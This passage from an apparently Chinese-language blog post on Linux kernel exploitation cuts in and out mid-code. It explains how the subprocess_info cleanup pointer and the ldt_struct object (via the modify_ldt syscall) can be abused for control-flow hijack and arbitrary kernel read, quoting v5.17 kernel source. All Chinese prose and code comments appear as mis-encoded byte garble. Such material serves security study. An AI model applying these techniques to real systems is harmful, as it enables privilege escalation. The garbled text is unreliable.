class="title">complete</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *path;</span><br><span class="line">    <span class="keyword">char</span> **argv;</span><br><span class="line">    <span class="keyword">char</span> **envp;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="keyword">int</span> wait;</span><br><span class="line">    <span class="keyword">int</span> retval;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">int</span> (*init)(struct subprocess_info *info, struct cred *<span class="keyword">new</span>);</span><br><span class="line">    <span class="keyword">void</span> (*cleanup)(struct subprocess_info *info);</span><br><span class="line">    <span class="keyword">void</span> *data;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></div></figure>

<p>è¯¥ç»“æ„ä½“åœ¨åˆ†é…æ—¶æœ€ç»ˆä¼šè°ƒç”¨å…¶ä¸­çš„<code>void (*cleanup)(struct subprocess_info *info);</code>å‡½æ•°æŒ‡é’ˆï¼Œæ‰€ä»¥å¦‚æœå­˜åœ¨ä¸€ä¸ªUAFå’Œæ¡ä»¶ç«äº‰ï¼Œåœ¨åˆ†é…æ—¶å¯åŠ¨å¦ä¸€ä¸ªçº¿ç¨‹ä¸æ–­ä¿®æ”¹è¯¥å‡½æ•°æŒ‡é’ˆï¼Œé‚£ä¹ˆå°±èƒ½åŠ«æŒç¨‹åºæµï¼Œå†åˆ©ç”¨ä¸€äº›gadgetå°±å¯ä»¥æ§åˆ¶å¾—åˆ°ã€‚</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/264563#h2-2" >SCTF flying_kernel å‡ºé¢˜æ€»ç»“ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="4-ldt-structç»“æ„ä½“â€”kmalloc-16"   >
          <a href="#4-ldt-structç»“æ„ä½“â€”kmalloc-16" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-ldt-structç»“æ„ä½“â€”kmalloc-16" class="headerlink" title="4.ldt_structç»“æ„ä½“â€”kmalloc-16"></a>4.ldt_structç»“æ„ä½“â€”kmalloc-16</h2>
      <p>å‚è€ƒï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/266897#h3-5" >åœ¨ 2021 å¹´å†çœ‹ ciscn_2017 - babydriverï¼ˆä¸‹ï¼‰ï¼šKPTI bypassã€ldt_struct çš„åˆ©ç”¨ã€pt_regs é€šç”¨å†…æ ¸ROPè§£æ³• - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="1-å‰ç½®çŸ¥è¯†"   >
          <a href="#1-å‰ç½®çŸ¥è¯†" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å‰ç½®çŸ¥è¯†" class="headerlink" title="(1)å‰ç½®çŸ¥è¯†"></a>(1)å‰ç½®çŸ¥è¯†</h3>
      
        <h4 id="ç»“æ„ä½“"   >
          <a href="#ç»“æ„ä½“" class="heading-link"><i class="fas fa-link"></i></a><a href="#ç»“æ„ä½“" class="headerlink" title="ç»“æ„ä½“"></a>ç»“æ„ä½“</h4>
      <p><code>ldt</code>æ˜¯å³å±€éƒ¨æ®µæè¿°ç¬¦è¡¨ï¼ˆLocal Descriptor Tableï¼‰ï¼Œå­˜æ”¾ç€è¿›ç¨‹çš„æ®µæè¿°ç¬¦ï¼Œåœ¨å†…æ ¸ä¸­æœ‰ç»“æ„ä½“<code>ldt_struct</code>ä¸ä¹‹å¯¹åº”ã€‚å¤§å°ä¸º0x10ã€‚</p>
<p>å¦‚ä¸‹ç»“æ„ä½“</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.17 /arch/x86/include/asm/mmu_context.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> &#123;</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Xen requires page-aligned LDTs with special permissions.  This is</span></span><br><span class="line"><span class="comment">	 * needed to prevent us from installing evil descriptors such as</span></span><br><span class="line"><span class="comment">	 * call gates.  On native, we could merge the ldt_struct and LDT</span></span><br><span class="line"><span class="comment">	 * allocations, but it&#x27;s not worth trying to optimize.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span>	*<span class="title">entries</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		nr_entries;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If PTI is in use, then the entries array is not mapped while we&#x27;re</span></span><br><span class="line"><span class="comment">	 * in user mode.  The whole array will be aliased at the addressed</span></span><br><span class="line"><span class="comment">	 * given by ldt_slot_va(slot).  We use two slots so that we can allocate</span></span><br><span class="line"><span class="comment">	 * and map, and enable a new LDT without invalidating the mapping</span></span><br><span class="line"><span class="comment">	 * of an older, still-in-use LDT.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * slot will be -1 if this LDT doesn&#x27;t have an alias mapping.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">int</span>			slot;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>è¯¥ç»“æ„ä½“å¯ä»¥é€šè¿‡ç³»ç»Ÿè°ƒç”¨<code>SYS_modify_ldt</code>æ¥æ“æ§ï¼Œæƒ³è¦è°ƒç”¨è¯¥ç³»ç»Ÿè°ƒç”¨å·éœ€è¦ç¼–è¯‘æ—¶å¼€å¯å¦‚ä¸‹è®¾ç½®ï¼Œä¸è¿‡ä¸€èˆ¬éƒ½æ˜¯é»˜è®¤å¼€å¯çš„ï¼Œä»v4.3ç‰ˆæœ¬æ‰å¼€å§‹è¾ƒä¸ºæ­£å¼çš„ä¸€ä¸ªç¼–è¯‘è®¾ç½®</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_MODIFY_LDT_SYSCALL=y</span><br></pre></td></tr></table></div></figure>


        <h4 id="ç³»ç»Ÿè°ƒç”¨å‡½æ•°"   >
          <a href="#ç³»ç»Ÿè°ƒç”¨å‡½æ•°" class="heading-link"><i class="fas fa-link"></i></a><a href="#ç³»ç»Ÿè°ƒç”¨å‡½æ•°" class="headerlink" title="ç³»ç»Ÿè°ƒç”¨å‡½æ•°"></a>ç³»ç»Ÿè°ƒç”¨å‡½æ•°</h4>
      <p>å…·ä½“çš„å‡½æ•°è°ƒç”¨å¦‚ä¸‹</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.17 /arch/x86/kernel/ldt.c</span></span><br><span class="line">SYSCALL_DEFINE3(modify_ldt, <span class="keyword">int</span> , func , <span class="keyword">void</span> __user * , ptr ,</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span> , bytecount)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> ret = -ENOSYS;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (func) &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">		ret = read_ldt(ptr, bytecount);<span class="comment">//è¯»å–</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">		ret = write_ldt(ptr, bytecount, <span class="number">1</span>);<span class="comment">//å†™å…¥</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">		ret = read_default_ldt(ptr, bytecount);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">0x11</span>:</span><br><span class="line">		ret = write_ldt(ptr, bytecount, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * The SYSCALL_DEFINE() macros give us an &#x27;unsigned long&#x27;</span></span><br><span class="line"><span class="comment">	 * return type, but tht ABI for sys_modify_ldt() expects</span></span><br><span class="line"><span class="comment">	 * &#x27;int&#x27;.  This cast gives us an int-sized value in %rax</span></span><br><span class="line"><span class="comment">	 * for the return code.  The &#x27;unsigned&#x27; is necessary so</span></span><br><span class="line"><span class="comment">	 * the compiler does not try to sign-extend the negative</span></span><br><span class="line"><span class="comment">	 * return codes into the high half of the register when</span></span><br><span class="line"><span class="comment">	 * taking the value from int-&gt;long.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>ä¹Ÿå°±æ˜¯ä¼ å…¥syscallç›¸å…³å‚æ•°ï¼Œä¼šè°ƒç”¨ä¸åŒå‡½æ•°ï¼Œ0å¯¹åº”<code>read_ldt</code>ï¼Œ1å¯¹åº”<code>write_ldt</code>(å…¶å®0x11çš„ä¹Ÿå·®ä¸å¤šï¼Œå°±æ˜¯<code>oldmode</code>è®¾ç½®ä¸º0äº†è€Œå·²ï¼Œå…·ä½“çš„è¿˜å¾—ä¾æ®æºç è¿›è¡Œåˆ†æ)ï¼Œä¾æ­¤çœ‹ä»£ç ç±»ä¼¼å¦‚ä¸‹</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//read_ldtä»ldt_struct-&gt;entriesè¯»å–8å­—èŠ‚ç»™buf</span></span><br><span class="line">syscall(SYS_modify_ldt, <span class="number">0</span>, &amp;buf, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//write_ldtä¾æ®ä¼ å…¥çš„bufæ•°æ®å’Œ sizeof(desc)åˆ›å»ºä¸€ä¸ªæ–°çš„ldt_structç»“æ„ä½“</span></span><br><span class="line">syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;buf, <span class="keyword">sizeof</span>(buf));</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-å®ç°ä»»æ„è¯»å–"   >
          <a href="#2-å®ç°ä»»æ„è¯»å–" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å®ç°ä»»æ„è¯»å–" class="headerlink" title="(2)å®ç°ä»»æ„è¯»å–"></a>(2)å®ç°ä»»æ„è¯»å–</h3>
      <p>ä¸»è¦çœ‹<code>write_ldt</code>å’Œ<code>read_ldt</code>å‡½æ•°ï¼Œç”±äºè°ƒç”¨<code>write_ldt</code>å‡½æ•°æ—¶ï¼Œä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„<code>ldt_struct</code>ä¸€äº›å’Œåˆ©ç”¨æ— å…³çš„ä»£ç å°±å…ˆçœç•¥äº†</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.17 /arch/x86/kernel/ldt.c</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">write_ldt</span><span class="params">(<span class="keyword">void</span> __user *ptr, <span class="keyword">unsigned</span> <span class="keyword">long</span> bytecount, <span class="keyword">int</span> oldmode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> *<span class="title">new_ldt</span>, *<span class="title">old_ldt</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> old_nr_entries, new_nr_entries;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">ldt_info</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> <span class="title">ldt</span>;</span></span><br><span class="line">	<span class="keyword">int</span> error;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//.........//</span></span><br><span class="line">    <span class="comment">//ä»ç”¨æˆ·æ•°æ®æ‹·è´sizeof(ldt_info)æ•°æ®ç»™ldt_info</span></span><br><span class="line">	<span class="keyword">if</span> (copy_from_user(&amp;ldt_info, ptr, <span class="keyword">sizeof</span>(ldt_info)))</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//.........//</span></span><br><span class="line">    <span class="comment">//ä¾æ®ä¸€äº›æ¡ä»¶æ¥è¿›è¡Œå¤„ç†</span></span><br><span class="line">	<span class="keyword">if</span> ((oldmode &amp;&amp; !ldt_info.base_addr &amp;&amp; !ldt_info.limit) ||</span><br><span class="line">	    LDT_empty(&amp;ldt_info)) &#123;</span><br><span class="line">		<span class="comment">/* The user wants to clear the entry. */</span></span><br><span class="line">		<span class="built_in">memset</span>(&amp;ldt, <span class="number">0</span>, <span class="keyword">sizeof</span>(ldt));</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//seg_32bitæœ€å¥½ç›´æ¥è®¾ç½®ä¸º1,ä¸è®¾ç½®å…¶å®ä¹Ÿä¸ä¼šè¿›å»å•¦,</span></span><br><span class="line">        <span class="comment">//allow_16bit_segmentsåŸºæœ¬éƒ½ä¼šè¿”å›true</span></span><br><span class="line">		<span class="keyword">if</span> (!ldt_info.seg_32bit &amp;&amp; !allow_16bit_segments()) &#123;</span><br><span class="line">			error = -EINVAL;</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">		&#125;    </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">static bool allow_16bit_segments(void)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">	if (!IS_ENABLED(CONFIG_X86_16BIT))</span></span><br><span class="line"><span class="comment">		return false;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#ifdef CONFIG_XEN_PV</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	 * Xen PV does not implement ESPFIX64, which means that 16-bit</span></span><br><span class="line"><span class="comment">	 * segments will not work correctly.  Until either Xen PV implements</span></span><br><span class="line"><span class="comment">	 * ESPFIX64 and can signal this fact to the guest or unless someone</span></span><br><span class="line"><span class="comment">	 * provides compelling evidence that allowing broken 16-bit segments</span></span><br><span class="line"><span class="comment">	 * is worthwhile, disallow 16-bit segments under Xen PV.</span></span><br><span class="line"><span class="comment">	if (xen_pv_domain()) &#123;</span></span><br><span class="line"><span class="comment">		pr_info_once(&quot;Warning: 16-bit segments do not work correctly in a Xen PV guest\n&quot;);</span></span><br><span class="line"><span class="comment">		return false;</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment">#endif</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	return true;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">		<span class="comment">//ä¸€äº›ç›¸å…³çš„è®¾ç½®,ä¼šå¯¼è‡´ldté‡Œçš„æ•°æ®è¢«æ›´æ”¹</span></span><br><span class="line">		fill_ldt(&amp;ldt, &amp;ldt_info);</span><br><span class="line">		<span class="keyword">if</span> (oldmode)</span><br><span class="line">			ldt.avl = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">static inline void fill_ldt(struct desc_struct *desc, const struct user_desc *info)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">	desc-&gt;limit0		= info-&gt;limit &amp; 0x0ffff;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	desc-&gt;base0		= (info-&gt;base_addr &amp; 0x0000ffff);</span></span><br><span class="line"><span class="comment">	desc-&gt;base1		= (info-&gt;base_addr &amp; 0x00ff0000) &gt;&gt; 16;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	desc-&gt;type		= (info-&gt;read_exec_only ^ 1) &lt;&lt; 1;</span></span><br><span class="line"><span class="comment">	desc-&gt;type	       |= info-&gt;contents &lt;&lt; 2;</span></span><br><span class="line"><span class="comment">	//Set the ACCESS bit so it can be mapped RO</span></span><br><span class="line"><span class="comment">	desc-&gt;type	       |= 1;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	desc-&gt;s			= 1;</span></span><br><span class="line"><span class="comment">	desc-&gt;dpl		= 0x3;</span></span><br><span class="line"><span class="comment">	desc-&gt;p			= info-&gt;seg_not_present ^ 1;</span></span><br><span class="line"><span class="comment">	desc-&gt;limit1		= (info-&gt;limit &amp; 0xf0000) &gt;&gt; 16;</span></span><br><span class="line"><span class="comment">	desc-&gt;avl		= info-&gt;useable;</span></span><br><span class="line"><span class="comment">	desc-&gt;d			= info-&gt;seg_32bit;</span></span><br><span class="line"><span class="comment">	desc-&gt;g			= info-&gt;limit_in_pages;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	desc-&gt;base2		= (info-&gt;base_addr &amp; 0xff000000) &gt;&gt; 24;</span></span><br><span class="line"><span class="comment">	//</span></span><br><span class="line"><span class="comment">	 * Don&#x27;t allow setting of the lm bit. It would confuse</span></span><br><span class="line"><span class="comment">	 * user_64bit_mode and would get overridden by sysret anyway.</span></span><br><span class="line"><span class="comment">	desc-&gt;l			= 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//.......//</span></span><br><span class="line">    <span class="comment">//ä¾æ®sizeof(ldt_struct)ç”¨kmallocç”³è¯·chunkä½œä¸ºnew_ldt</span></span><br><span class="line">	new_ldt = alloc_ldt_struct(new_nr_entries);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">static struct ldt_struct *alloc_ldt_struct(unsigned int num_entries)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">	struct ldt_struct *new_ldt;</span></span><br><span class="line"><span class="comment">	unsigned int alloc_size;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	//.....//</span></span><br><span class="line"><span class="comment">	//ä¾æ®sizeof(ldt_struct)ç”¨kmallocç”³è¯·chunkä½œä¸ºnew_ldt</span></span><br><span class="line"><span class="comment">	new_ldt = kmalloc(sizeof(struct ldt_struct), GFP_KERNEL_ACCOUNT);</span></span><br><span class="line"><span class="comment">	//....//</span></span><br><span class="line"><span class="comment">	 </span></span><br><span class="line"><span class="comment">	if (alloc_size &gt; PAGE_SIZE)</span></span><br><span class="line"><span class="comment">		new_ldt-&gt;entries = __vmalloc(alloc_size, GFP_KERNEL_ACCOUNT | __GFP_ZERO);</span></span><br><span class="line"><span class="comment">	else</span></span><br><span class="line"><span class="comment">		new_ldt-&gt;entries = (void *)get_zeroed_page(GFP_KERNEL_ACCOUNT);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	if (!new_ldt-&gt;entries) &#123;</span></span><br><span class="line"><span class="comment">		kfree(new_ldt);</span></span><br><span class="line"><span class="comment">		return NULL;</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	//The new LDT isn&#x27;t aliased for PTI yet. </span></span><br><span class="line"><span class="comment">	new_ldt-&gt;slot = -1;</span></span><br><span class="line"><span class="comment">	new_ldt-&gt;nr_entries = num_entries;</span></span><br><span class="line"><span class="comment">	return new_ldt;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//.......//</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//è®¾ç½®æ–°ldt_structç»“æ„ä½“çš„entriesæŒ‡é’ˆ</span></span><br><span class="line">    <span class="keyword">if</span> (old_ldt)</span><br><span class="line">        <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ä»ldtç»“æ„ä½“ä¸­æ‹·è´8ä¸ªå­—èŠ‚åˆ°å¯¹åº”ä½ç½®</span></span><br><span class="line">    new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//......///</span></span><br><span class="line">    </span><br><span class="line">    install_ldt(mm, new_ldt);</span><br><span class="line">	unmap_ldt_struct(mm, old_ldt);</span><br><span class="line">	free_ldt_struct(old_ldt);</span><br><span class="line">    <span class="comment">//......//</span></span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<ul>
<li>å°†æˆ‘ä»¬çš„ä¼ å…¥çš„æ•°æ®æŒ‡é’ˆ<code>ptr</code>ï¼Œå½“ä½œä¸€ä¸ª<code>user_desc</code>ç»“æ„ä½“æ‹·è´ç»™<code>ldt_info</code></li>
<li>ç„¶åä¾æ®<code>ldt_info</code>æ¥è®¾ç½®<code>desc_struct</code>ç»“æ„ä½“<code>ldt</code></li>
<li>ä¹‹åä¾æ®<code>sizeof(ldt_struct)</code>ç”¨<code>kmalloc</code>ç”³è¯·<code>chunk</code>ä½œä¸º<code>new_ldt</code></li>
<li>å¦‚æœå­˜åœ¨<code>old_ldt</code>ï¼Œé‚£ä¹ˆå°±å°†<code>old_ldt-&gt;entriesd</code>çš„æ•°æ®çš„æ‹·è´ç»™æ–°çš„<code>new_ldt-&gt;entries</code></li>
<li>æœ€åå°†<code>ldt</code>(8ä¸ªå­—èŠ‚)çš„å†…å®¹èµ‹å€¼ç»™<code>new_ldt-&gt;entries[ldt_info.entry_number]</code></li>
<li>åœ¨é€€å‡ºå‰è¿˜ä¼šæ’å…¥<code>new_ldt</code>å¹¶ä¸”è§£å¼€<code>old_ldt</code>ï¼Œé‡Šæ”¾<code>old_ldt</code></li>
</ul>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.17 /arch/x86/include/uapi/asm/ldt.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> &#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  entry_number;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  base_addr;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  limit;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  seg_32bit:<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  contents:<span class="number">2</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  read_exec_only:<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  limit_in_pages:<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  seg_not_present:<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  useable:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __x86_64__</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Because this bit is not present in 32-bit user code, user</span></span><br><span class="line"><span class="comment">	 * programs can pass uninitialized values here.  Therefore, in</span></span><br><span class="line"><span class="comment">	 * any context in which a user_desc comes from a 32-bit program,</span></span><br><span class="line"><span class="comment">	 * the kernel must act as though lm == 0, regardless of the</span></span><br><span class="line"><span class="comment">	 * actual value.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  lm:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//v5.17 /arch/x86/include/asm/desc_defs.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> 